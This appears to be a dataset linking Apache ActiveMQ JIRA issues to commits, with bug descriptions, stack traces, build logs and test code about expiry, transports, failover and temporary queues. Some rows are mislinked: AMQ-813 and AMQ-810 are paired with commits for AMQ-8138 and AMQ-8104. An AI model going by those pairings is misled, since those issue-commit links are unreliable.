12482850,AMQ-1112,Ensure messages that are expired are removed from message store and message cursrors are also updated consistently,6a121b33eded87b3aacfef2feebdb4175b7eb31e,"test for no consumer and expiry - https://issues.apache.org/activemq/browse/AMQ-1112

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@790928 13f79535-47bb-0310-9956-ffa450edef68"
12482850,AMQ-1112,Ensure messages that are expired are removed from message store and message cursrors are also updated consistently,30db300a1ab0cbf68d26936b3d0db378c83196d2,"add new policyEntry attributed to schema for : https://issues.apache.org/activemq/browse/AMQ-1112

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@807969 13f79535-47bb-0310-9956-ffa450edef68"
12482341,AMQ-1103,<NA>,b4c3a30b9e061868630ba19b14d88c61cd1ac44f,"Fix for https://issues.apache.org/activemq/browse/AMQ-1103

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@646477 13f79535-47bb-0310-9956-ffa450edef68"
12482773,AMQ-1098,"Trying to run the sample producer out of the main trunk using an https url throws a ClassCastException.  I've tracked this down in the code to the fact that HttpTransportFactory.java expects to find an HttpClientTransport but HttpsTransportFactory does not override createTransport() to create an HttpsClientTransport instead (HttpsClientTransport does not exist as a class).

Thanks,

Hernan

$ ant producer
Buildfile: build.xml

init:

compile:

producer:
     [echo] Running producer against server at $url = https://my.example.com:2222 for subject $subject = TEST.FOO
     [java] Connecting to URL: https://my.example.com:7043
     [java] Publishing a Message with size 1000 to topic: TEST.FOO
     [java] Using non-persistent messages
     [java] Sleeping between publish 0 ms
     [java] javax.jms.JMSException: Could not create Transport. Reason: java.lang.ClassCastException: org.apache.activemq.transport.https.HttpsTransport
     [java] Caught: javax.jms.JMSException: Could not create Transport. Reason: java.lang.ClassCastException: org.apache.activemq.transport.https.HttpsTransport
     [java]     at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:33)
     [java]     at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:229)
     [java]     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:242)
     [java]     at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:211)
     [java]     at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:158)
     [java]     at ProducerTool.run(Unknown Source)
     [java]     at ProducerTool.main(Unknown Source)
     [java] Caused by: java.lang.ClassCastException: org.apache.activemq.transport.https.HttpsTransport
     [java]     at org.apache.activemq.transport.http.HttpTransportFactory.compositeConfigure(HttpTransportFactory.java:62)
     [java]     at org.apache.activemq.transport.TransportFactory.configure(TransportFactory.java:213)
     [java]     at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:117)
     [java]     at org.apache.activemq.transport.TransportFactory.doConnect(TransportFactory.java:43)
     [java]     at org.apache.activemq.transport.TransportFactory.connect(TransportFactory.java:77)
     [java]     at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:227)
     [java]     ... 5 more

BUILD SUCCESSFUL
Total time: 2 seconds
",14a98e7958e2293845d41f408b3fc8ec9e4621ac,"apply patch from AMQ-1098

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@728687 13f79535-47bb-0310-9956-ffa450edef68"
12482445,AMQ-1027,"After failover transport reconnect, if there is prefetched messages on the client, client sends invalid ack messages to the server. After that client stops receiving messages and it must be restarted.
This happens only when there are more messages in the queue, than queue prefetch size.
There is attached test case, which reproduces this error. Unfortunately, theres error in NetworkTestSupport.restartRemoteBroker() (after restart client cannot receive messages left in the queue). So you must use external broker an restart it manually, when the test asks you to do that. Should I report this bug in Component ""Test cases""?",34fb326a0abb2cad4b443bb981787002d23de5e1,"added test case for AMQ-1027

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@475680 13f79535-47bb-0310-9956-ffa450edef68"
12482620,AMQ-1017,A build of a fresh checkout from https://svn.apache.org/repos/asf/incubator/activemq/trunk with Maven2 fails. See the attached log of the build.,6be185d2ce739ea04c6a85b9bba074771dde4689,"Changes to POM to try fix AMQ-1017

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@472483 13f79535-47bb-0310-9956-ffa450edef68"
12481954,AMQ-944,"It seems that one can nto use multicast in a transportConnector.

Description of the test:
In the distribution, go into /example
Edit the build.xml in order to use multicast. for instance
Change the URL in the build.xml to :
<property name=""url"" value=""multicast://225.0.0.1:61620"" />
Start the producer: ant producer

Here is the output:
    [echo] Running producer against server at $url = multicast://225.0.0.1:61620 for subject $subject = Syntheses
    [java] Connecting to URL: multicast://225.0.0.1:61620
    [java] Publishing a Message with size 1000 to queue: Syntheses
    [java] Using non-durable publishing
    [java] Sleeping between publish 0 ms
    [java] DEBUG MulticastTransport             - Joining multicast address: /225.0.0.1
    [java] DEBUG UdpTransport                   - Consumer thread starting for: multicast://225.0.0.1:61620@0
    [java] DEBUG UdpTransport                   - Sending oneway from: multicast://225.0.0.1:61620@0 to target: /225.0.
0.1:61620 command: ConnectionInfo {commandId = 1, responseRequired = true, connectionId = ID:ZOZMA-2042-1159347487015-0:
0, clientId = ID:ZOZMA-2042-1159347487015-1:0, userName = null, password = null, brokerPath = null, brokerMasterConnecto
r = false, manageable = true}
    [java] DEBUG DefaultReplayBuffer            - Adding command ID: 1 to replay buffer: org.apache.activemq.transport.
reliable.DefaultReplayBuffer@1b3f829 object: [B@698403
    [java] DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 sending datagram: 1 to: /225.0
.0.1:61620
    [java] DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 about to process: ConnectionIn
fo {commandId = 1, responseRequired = true, connectionId = ID:ZOZMA-2042-1159347487015-0:0, clientId = ID:ZOZMA-2042-115
9347487015-1:0, userName = null, password = null, brokerPath = null, brokerMasterConnector = false, manageable = true}
    [java] DEBUG ReliableTransport              - Still waiting for response on: multicast://225.0.0.1:61620@0 to comma
nd: ConnectionInfo {commandId = 1, responseRequired = true, connectionId = ID:ZOZMA-2042-1159347487015-0:0, clientId = I
D:ZOZMA-2042-1159347487015-1:0, userName = null, password = null, brokerPath = null, brokerMasterConnector = false, mana
geable = true} sending replay message
    [java] DEBUG UdpTransport                   - Sending oneway from: multicast://225.0.0.1:61620@0 to target: /192.9.
211.39:61620 command: ReplayCommand {commandId = 2, firstNakNumber = 1, lastNakNumber = 1}
    [java] DEBUG DefaultReplayBuffer            - Adding command ID: 2 to replay buffer: org.apache.activemq.transport.
reliable.DefaultReplayBuffer@1b3f829 object: [B@d02b51
    [java] DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 sending datagram: 2 to: /192.9
.211.39:61620
    [java] DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 about to process: ReplayComman
d {commandId = 2, firstNakNumber = 1, lastNakNumber = 1}
    [java] DEBUG ReliableTransport              - Processing replay command: ReplayCommand {commandId = 2, firstNakNumb
er = 1, lastNakNumber = 1}
    [java] DEBUG DefaultReplayBuffer            - Buffer: org.apache.activemq.transport.reliable.DefaultReplayBuffer@1b
3f829 replaying messages from: 1 to: 1
*     [java] DEBUG CommandDatagramSocket          - Channel: multicast://225.0.0.1:61620@0 REDELIVERING datagram: 1 to: /
225.0.0.1:61620*
",63b82516a41ed5e045776a2d39ebfa1c83ed4b09,"applied patch for AMQ-944

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@515556 13f79535-47bb-0310-9956-ffa450edef68"
12482062,AMQ-936,"I have a sample app that sends a message to a queue, that has producer.setTimeToLive(5000);

I take this to mean that any message sent via this producer will expire after 5 seconds

When I attach a consumer and try to consume after ay 10 seconds the messages are delivered. ",e8bae06604e3d1dee6007b9a23b5476fcdcde5d0,"Added unit test for consuming expired topic and queue. - AMQ-936

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@451612 13f79535-47bb-0310-9956-ffa450edef68"
12481776,AMQ-888,"robert burrell donkin reported:
{quote}
missing license headers from some of the files i checked at random
gives me concerns. for example:

maven-bundle-plugin/src/main/java/org/apache/activemq/maven/BundleMojo.java

activemq-web-demo worries me: there are a lot of files without license
headers and some which have them were not created at the ASF (which is
ok but gives me concerns about the rest).

i would like to see the issue of licenses in the source tidied up
before this release ships. i haven't gone through every file but IMO
this needs to be done.
{quote}",07c1e65c225415b09302a058dcade55c3adcab36,"http://issues.apache.org/activemq/browse/AMQ-888

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@433353 13f79535-47bb-0310-9956-ffa450edef68"
12481772,AMQ-886,<NA>,58d4605661f1563e4303f9279fa583af6c07c206,"Fix for http://issues.apache.org/activemq/browse/AMQ-886

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@433244 13f79535-47bb-0310-9956-ffa450edef68"
12481732,AMQ-876,"Keep getting exception below.  Note that you are looking for queue-data-1, but actual file name is data-queue-data-1

$ pwd
  /cygdrive/d/amq/activemq-kaha/kaha.db
$ ls
data-kaha-1  data-queue-data-1  index-kaha  index-queue-data  index-transactions

javax.jms.JMSException: java.io.IOException: Could not locate data file queue-data-1
        at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:46)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1154)
        at org.apache.activemq.TransactionContext.commit(TransactionContext.java:260)
        at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:464)
        at com.barra.cp.common.io.MultiQueueReceiver.onMessage(MultiQueueReceiver.java:163)
        at com.barra.cp.common.io.SingleMessageMultiQueueReceiver$OneMessageAtATime.runMultiQueue(SingleMessageMultiQueueReceiver.java:176)
        at com.barra.cp.common.io.SingleMessageMultiQueueReceiver$OneMessageAtATime.doRun(SingleMessageMultiQueueReceiver.java:143)
        at com.barra.cp.common.io.SingleMessageMultiQueueReceiver$OneMessageAtATime.run(SingleMessageMultiQueueReceiver.java:124)
        at java.lang.Thread.run(Unknown Source)
Caused by: org.apache.activemq.kaha.RuntimeStoreException: java.io.IOException: Could not locate data file queue-data-1
        at org.apache.activemq.kaha.impl.MapContainerImpl.getValue(MapContainerImpl.java:340)
        at org.apache.activemq.kaha.impl.MapContainerImpl.remove(MapContainerImpl.java:265)
        at org.apache.activemq.store.kahadaptor.KahaMessageStore.removeMessage(KahaMessageStore.java:68)
        at org.apache.activemq.store.kahadaptor.KahaTransaction.commit(KahaTransaction.java:92)
        at org.apache.activemq.store.kahadaptor.KahaTransactionStore.commit(KahaTransactionStore.java:95)
        at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:68)
        at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:154)
        at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:92)
        at org.apache.activemq.broker.BrokerFilter.commitTransaction(BrokerFilter.java:92)
        at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:102)
        at org.apache.activemq.broker.AbstractConnection.processCommitTransactionOnePhase(AbstractConnection.java:330)
        at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:99)
        at org.apache.activemq.broker.AbstractConnection.service(AbstractConnection.java:228)
        at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:63)
        at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:92)
        at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:67)
        at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:123)
        at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:123)
        at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:88)
        at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:127)
        ... 1 more
Caused by: java.io.IOException: Could not locate data file queue-data-1
        at org.apache.activemq.kaha.impl.DataManager.getDataFile(DataManager.java:117)
        at org.apache.activemq.kaha.impl.StoreDataReader.readItem(StoreDataReader.java:62)
        at org.apache.activemq.kaha.impl.DataManager.readItem(DataManager.java:121)
        at org.apache.activemq.kaha.impl.MapContainerImpl.getValue(MapContainerImpl.java:337)
        ... 20 more
",6e8044251947ebb95ad504646144c85228d9711b,"work for https://issues.apache.org/activemq/browse/AMQ-876

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@453124 13f79535-47bb-0310-9956-ffa450edef68"
12481736,AMQ-858,"We need to move all the m2 plugins under tooling/ (they nearly all are) then create a pom.xml there for building all the tooling plugings.

Folks from there can then do 'mvn clean install' to build and install all the m2 plugins. We can then create a nightly build of the m2 plugins easily.

(Right now plugins are not always auto-downloaded when folks try to use stuff in say activemq-perftest module)....

e.g.

macstrac:/workspace/eclipse/activemq jstrachan$ cd activemq-perftest/
macstrac:/workspace/eclipse/activemq/activemq-perftest jstrachan$ mvn activemq-perf:broker
[INFO] Scanning for projects...
[INFO] Searching repository for plugin with prefix: 'activemq-perf'.
[INFO] org.apache.maven.plugins: checking for updates from apache-snapshots
[INFO] org.codehaus.mojo: checking for updates from apache-snapshots
[INFO] artifact org.apache.maven.plugins:maven-compiler-plugin: checking for updates from apache-snapshots
[INFO] snapshot org.apache.maven.plugins:maven-compiler-plugin:2.1-SNAPSHOT: checking for updates from apache-snapshots
[INFO] artifact org.apache.maven.plugins:maven-eclipse-plugin: checking for updates from apache-snapshots
[INFO] snapshot org.apache.maven.plugins:maven-eclipse-plugin:2.3-SNAPSHOT: checking for updates from apache-snapshots
[INFO] snapshot org.apache.maven.plugins:maven-plugins:2-SNAPSHOT: checking for updates from apache-snapshots
[INFO] artifact org.apache.activemq:maven-activemq-memtest-plugin: checking for updates from apache-snapshots
[INFO] artifact org.apache.activemq:maven-activemq-memtest-plugin: checking for updates from central
[INFO] ------------------------------------------------------------------------
[ERROR] BUILD ERROR
[INFO] ------------------------------------------------------------------------
[INFO] The plugin 'org.apache.activemq:maven-activemq-memtest-plugin' does not exist or no valid version could be found
[INFO] ------------------------------------------------------------------------
[INFO] For more information, run Maven with the -e switch
[INFO] ------------------------------------------------------------------------
[INFO] Total time: 13 seconds
[INFO] Finished at: Thu Aug 03 02:55:57 BST 2006
[INFO] Final Memory: 3M/5M
[INFO] ------------------------------------------------------------------------",d8ff65aab0b2659708b9ab85f42e449555250a37,"Sorry, wasn't included in the previous checkin. Related to AMQ-858.

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@428654 13f79535-47bb-0310-9956-ffa450edef68"
12481796,AMQ-849,"Noticed that when using copyOnSend feature and compression, sent messages were not being compressed. It was then found that this was due to the fact that the connection that is used to determine whether compression should be performed or not, was null for the copied message. A look into the Message found that the connection and a number of other properties of the Message were not copied in the copy(Message) 

The patch attached copies the remaining properties of the Message to the message copy.",c36ea1aa9b11ab1cf8763ba6744b79df1cae6460,"applied patch from Mathew Kuppe for AMQ-849 - many thanks!

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@426438 13f79535-47bb-0310-9956-ffa450edef68"
12481795,AMQ-813,"See attached thread dump. I think we just need to use a timeout on the close operations (such as to close consumers, sessions, producers)

Full thread dump Java HotSpot(TM) Client VM (1.5.0_04-b05 mixed mode, sharing):
 
""Shutdown"" prio=1 tid=0x08385960 nid=0x5e99 in Object.wait() [0xaed7d000..0xaed7e130]
        at java.lang.Object.wait(Native Method)
        - waiting on <0x88af01c8> (a edu.emory.mathcs.backport.java.util.concurrent.locks.CondVar)
        at java.lang.Object.wait(Object.java:474)
        at edu.emory.mathcs.backport.java.util.concurrent.locks.CondVar.await(CondVar.java:75)
        - locked <0x88af01c8> (a edu.emory.mathcs.backport.java.util.concurrent.locks.CondVar)
        at edu.emory.mathcs.backport.java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:318)
        at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:41)
        at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:72)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1130)
        at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1660)
        at org.apache.activemq.ActiveMQMessageConsumer.close(ActiveMQMessageConsumer.java:516)
        at org.apache.activemq.web.WebClient.closeConsumers(WebClient.java:135)
        - locked <0x893e6558> (a org.apache.activemq.web.WebClient)
        at org.apache.activemq.web.WebClient.close(WebClient.java:145)
        - locked <0x893e6558> (a org.apache.activemq.web.WebClient)
        at org.apache.activemq.web.WebClient.valueUnbound(WebClient.java:318)
        at org.mortbay.jetty.servlet.AbstractSessionManager$Session.unbindValue(AbstractSessionManager.java:899)
        at org.mortbay.jetty.servlet.AbstractSessionManager$Session.invalidate(AbstractSessionManager.java:755)
        - locked <0x893caa88> (a org.mortbay.jetty.servlet.HashSessionManager$Session)
        at org.mortbay.jetty.servlet.AbstractSessionManager.doStop(AbstractSessionManager.java:551)
        at org.mortbay.component.AbstractLifeCycle.stop(AbstractLifeCycle.java:63)
        at org.mortbay.jetty.servlet.SessionHandler.doStop(SessionHandler.java:124)
        at org.mortbay.component.AbstractLifeCycle.stop(AbstractLifeCycle.java:63)
        at org.mortbay.jetty.handler.HandlerWrapper.doStop(HandlerWrapper.java:131)
        at org.mortbay.jetty.handler.ContextHandler.doStop(ContextHandler.java:467)
        at org.mortbay.jetty.webapp.WebAppContext.doStop(WebAppContext.java:477)
        at org.mortbay.component.AbstractLifeCycle.stop(AbstractLifeCycle.java:63)
        at org.mortbay.jetty.handler.HandlerCollection.doStop(HandlerCollection.java:173)
        at org.mortbay.component.AbstractLifeCycle.stop(AbstractLifeCycle.java:63)
        at org.mortbay.jetty.handler.HandlerCollection.doStop(HandlerCollection.java:173)
        at org.mortbay.component.AbstractLifeCycle.stop(AbstractLifeCycle.java:63)
        at org.mortbay.jetty.handler.HandlerWrapper.doStop(HandlerWrapper.java:131)
        at org.mortbay.jetty.Server.doStop(Server.java:242)
        at org.mortbay.component.AbstractLifeCycle.stop(AbstractLifeCycle.java:63)
        at org.mortbay.jetty.Server$ShutdownHookThread.run(Server.java:450)",2e169f0bc3db3e16fe2928ac03b3308c69b5e72a,[AMQ-8138] Set client IP address with Stomp host header
12481709,AMQ-810,The subscription conduit is blocking out subsequent subscriptions from being propagated over the network bridge,75fde7165e9541da926ecc9763c905b9783f4c82,"http://issues.apache.org/activemq/browse/AMQ-810


git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@420721 13f79535-47bb-0310-9956-ffa450edef68"
12481709,AMQ-810,The subscription conduit is blocking out subsequent subscriptions from being propagated over the network bridge,651c5ff2cfe72c0de5f4f486c965cdbb80ceba0d,"- Tests AMQ-8104
- Fixes AMQ-8104"
12481711,AMQ-801,it should be in the activemq.jar and in the lib directory...,07529a5f05cc3940c0ce0c73aecdf26959b983bf,"AMQ-801: Bundle activemq-jaas with dsitro

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@469670 13f79535-47bb-0310-9956-ffa450edef68"
12481720,AMQ-790,"It seems we don't currently support regular Spring XML configuration files when using the 'activemq' command. 

Steps to reproduce:

[john@prokopiev jms]$ unzip incubator-activemq-4.0.1.zip
Archive:  incubator-activemq-4.0.1.zip
  creating: incubator-activemq-4.0.1/
  creating: incubator-activemq-4.0.1/bin/
  creating: incubator-activemq-4.0.1/conf/
  creating: incubator-activemq-4.0.1/docs/
  creating: incubator-activemq-4.0.1/example/
  creating: incubator-activemq-4.0.1/example/activemq-web-console/
...
  inflating: incubator-activemq-4.0.1/userGuide.html
  inflating: incubator-activemq-4.0.1/var/activemq.log
[john@prokopiev jms]$ echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE beans PUBLIC ""-//SPRING//DTD BEAN//EN""
""http://www.springframework.org/dtd/spring-beans.dtd"">
<beans>
<bean id=""broker"" class=""org.apache.activemq.broker.BrokerService""
init-method=""start"">
<property name=""transportConnectorURIs"">
<list>
<value>tcp://localhost:61234</value>
</list>
</property>
</bean>
</beans> ' > incubator-activemq-4.0.1/conf/activemq.xml
[john@prokopiev jms]$ cd incubator-activemq-4.0.1/bin
[john@prokopiev bin]$ sh activemq
ACTIVEMQ_HOME: /home/john/devel/java/jms/incubator-activemq-4.0.1
Loading message broker from: xbean:activemq.xml
INFO  BrokerService                  - ActiveMQ 4.0.1 JMS Message Broker
(localhost) is starting
INFO  BrokerService                  - For help or more information please
see: http://incubator.apache.org/activemq/
INFO  JDBCPersistenceAdapter         - Database driver recognized:
[apache_derby_embedded_jdbc_driver]
INFO  JournalPersistenceAdapter      - Journal Recovery Started from: Active
Journal: using 2 x 20.0 Megs at:
/home/john/devel/java/jms/incubator-activemq-4.0.1/bin/activemq-data/localhost/journal
INFO  JournalPersistenceAdapter      - Journal Recovered: 0 message(s) in
transactions recovered.
INFO  TransportServerThreadSupport   - Listening for connections at:
tcp://prokopiev.stc.donpac.ru:61234
INFO  TransportConnector             - Connector
tcp://prokopiev.stc.donpac.ru:61234 Started
INFO  BrokerService                  - ActiveMQ JMS Message Broker
(localhost, ID:prokopiev.stc.donpac.ru-41458-1151926448246-1:0) started
ERROR: java.lang.RuntimeException: Failed to execute start task. Reason:
java.lang.ClassCastException: org.apache.activemq.broker.BrokerService
ERROR: java.lang.Exception: java.lang.ClassCastException:
org.apache.activemq.broker.BrokerService
INFO  BrokerService                  - ActiveMQ Message Broker (localhost,
ID:prokopiev.stc.donpac.ru-41458-1151926448246-1:0) is shutting down
INFO  TransportConnector             - Connector
tcp://prokopiev.stc.donpac.ru:61234 Stopped
INFO  VMTransportFactory             - Shutting down VM connectors for
broker: localhost
INFO  BrokerService                  - ActiveMQ JMS Message Broker
(localhost, ID:prokopiev.stc.donpac.ru-41458-1151926448246-1:0) stopped",98dcd68429cb19d9cbd8e0a165fdbbf8790dbe41,"log the exception stack trace when the activemq script fails - see AMQ-790 for detail

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@418766 13f79535-47bb-0310-9956-ffa450edef68"
12481778,AMQ-789,<NA>,98a6f181ca990fd2e66bb1c8d696168bae1da74e,"http://issues.apache.org/activemq/browse/AMQ-789

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@423784 13f79535-47bb-0310-9956-ffa450edef68"
12482186,AMQ-777,"
I saw this entry in the forums and I'm having the same problem, setting maxReconnectAttempts to a specific value does not stop the infinite loop of ""Waiting for transport to reconnect"" from occuring.

http://www.nabble.com/Discovery-Fail-if-no-Broker-t1824894.html#a4977620

The forum reply from Hiram Chirino suggests it's a bug but I didn't find an associated JIRA issue.

Jonny",d3d58fe41d2e946f87abcbf1001be51e18749075,"Test case and Fix for https://issues.apache.org/activemq/browse/AMQ-777


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@587216 13f79535-47bb-0310-9956-ffa450edef68"
12481763,AMQ-755,"We have been experiencing some fairly serious problems with timeouts using
Spring, Lingo and a network of ActiveMQ brokers.

As I understand it, lingo creates temporary queues to transport the remote
procedure calls across JMS.

We are suspicious that the messaging roundtrip gets interrupted or lost when
using broker networks.

We integrated ActiveMQ 4.0 into our project this week and ran the JMX
jconsole to look at our broker network.

We see temporary queues come and go, and what we are expecting is complete
replication of the queues on each broker. Is this expectation correct?
This is not what we are seeing.

We believe that two things are happening:

1) Temporary queues are not being cleaned up properly on all brokers.

2) Temporary queues are not being created on a new broker when it is taken
down and then restarted.

Your feedback on these apparent issues would be appreciated.

To substantiate our theory we created a couple of JUnit tests. (Our test
cases do not include Lingo - just ActiveMQ client to broker.)

TEST 1

We create a network of brokers, create a message queue, send a message and
then take a broker down. We are expecting that the temporary message queue
created will be removed from both brokers. It is not.

The test fails on the last assert with:

junit.framework.AssertionFailedError: No queues on broker 3 expected:<1> but
was:<0>

Source code follows:


 public void testTempQueueCleanup() throws Exception {
   ActiveMQConnectionFactory cf;
   Connection conn = null;
   Session sess = null;
   try {
     cf = new ActiveMQConnectionFactory(

""failover:(tcp://localhost:61626%3FsoTimeout=5000,tcp://localhost:61627%3FsoTimeout=5000)?maximumRetries=0&amp;establishConnectionTimeout=21000&amp;keepAliveTimeout=300000"");
     conn = cf.createConnection();

     sess = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);

     TemporaryQueue q = sess.createTemporaryQueue();

     BrokerService broker2 = createBroker(""broken2"",
""tcp://localhost:61627"", ""static:(tcp://localhost:61626)"");

     Thread.sleep(5000);

     assertEquals(""No queues on broker 1"", 1,
broker1.getAdminView().getTemporaryQueues().length);
     assertEquals(""No queues on broker 2"", 1,
broker2.getAdminView().getTemporaryQueues().length);

     q.delete();

     assertEquals(""Temp queue left behind on broker 1"", 0,
broker1.getAdminView().getTemporaryQueues().length);
     assertEquals(""Temp queue left behind on broker 2"", 0,
broker2.getAdminView().getTemporaryQueues().length);

     broker2.stop();

   } finally {
     if (sess!=null)
       sess.close();
     if (conn!=null)
       conn.close();
   }
 }


TEST 2
When stopping a broker and then restarting it, we expect to see all queues
replicated on the new broker.

This test fails with:

junit.framework.AssertionFailedError: No queues on broker 3 expected:<1> but
was:<0>

Source code:

 public void testTempQueueRecovery() throws Exception {
   ActiveMQConnectionFactory cf;
   Connection conn = null;
   Session sess = null;
   try {
     cf = new ActiveMQConnectionFactory(

""failover:(tcp://localhost:61626%3FsoTimeout=5000,tcp://localhost:61627%3FsoTimeout=5000)?maximumRetries=0&amp;establishConnectionTimeout=21000&amp;keepAliveTimeout=300000"");
     conn = cf.createConnection();

     sess = conn.createSession(false, Session.AUTO_ACKNOWLEDGE);

     TemporaryQueue q = sess.createTemporaryQueue();

     BrokerService broker2 = createBroker(""broken2"",
""tcp://localhost:61627"",
""static:(tcp://localhost:61626,tcp://localhost:61628)"");

     Thread.sleep(5000);

     assertEquals(""No queues on broker 1"", 1,
broker1.getAdminView().getTemporaryQueues().length);
     assertEquals(""No queues on broker 2"", 1,
broker2.getAdminView().getTemporaryQueues().length);

     BrokerService broker3 = createBroker(""broken3"",
""tcp://localhost:61628"",
""static:(tcp://localhost:61626,tcp://localhost:61627)"");

     assertEquals(""No queues on broker 3"", 1,
broker3.getAdminView().getTemporaryQueues().length);

     Thread.sleep(5000);

     q.delete();

     Thread.sleep(5000);

     assertEquals(""Temp queue left behind on broker 1"", 0,
broker1.getAdminView().getTemporaryQueues().length);
     assertEquals(""Temp queue left behind on broker 2"", 0,
broker2.getAdminView().getTemporaryQueues().length);
     assertEquals(""Temp queue left behind on broker 3"", 0,
broker3.getAdminView().getTemporaryQueues().length);

     broker3.stop();
     broker2.stop();

   } finally {
     if (sess!=null)
       sess.close();
     if (conn!=null)
       conn.close();
   }
 }

",7606053815c5944ad0299587e85ded5f4067d7a0,"test case for: http://issues.apache.org/activemq/browse/AMQ-755
ensure temp destination infomation is propagated around network of brokers correctly

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@417744 13f79535-47bb-0310-9956-ffa450edef68"
12482050,AMQ-750,"Modified ProducerTool.java into multi-threaded test code:

This is the peudo code:

For ( thread 1 to 30 ) 
{ 
    Connection connection = createConnection(); 
    Session session = createSession(connection); 
   Producer producer = createProducer(session); 
   sendMessages(producer, 10); //each thread send 10 messages to broker, using url = failover:tcp://localhost:61616
} 

Please turn on Debug info for log4j, otherwise you will hit other threading issue before this one, when client shutting down, this exception will be thrown:
Thread-13 Sending total message: 10 Total time: 203 DONE !!!

[                     Thread-13] FailoverTransport              DEBUG Stopped.
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: socket closed
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
	at java.lang.Thread.run(Thread.java:595)
[            ActiveMQ Scheduler] InactivityMonitor              DEBUG Message sent since last write check, resetting flag
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: Connection reset
	at java.net.SocketInputStream.read(SocketInputStream.java:168)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
	at java.lang.Thread.run(Thread.java:595)
[                 ActiveMQ Task] FailoverTransport              DEBUG Attempting connect to: tcp://localhost:61616


Thread-17 Sending total message: 10 Total time: 109 DONE !!!
[                     Thread-17] FailoverTransport              DEBUG Stopped.
[cp://localhost/127.0.0.1:61616] FailoverTransport              DEBUG Transport failed, starting up reconnect task
java.net.SocketException: socket closed
	at java.net.SocketInputStream.socketRead0(Native Method)
	at java.net.SocketInputStream.read(SocketInputStream.java:129)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.fill(TcpBufferedInputStream.java:48)
	at org.apache.activemq.transport.tcp.TcpBufferedInputStream.read(TcpBufferedInputStream.java:55)
	at java.io.DataInputStream.readInt(DataInputStream.java:353)
	at org.apache.activemq.openwire.OpenWireFormat.unmarshal(OpenWireFormat.java:274)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:142)
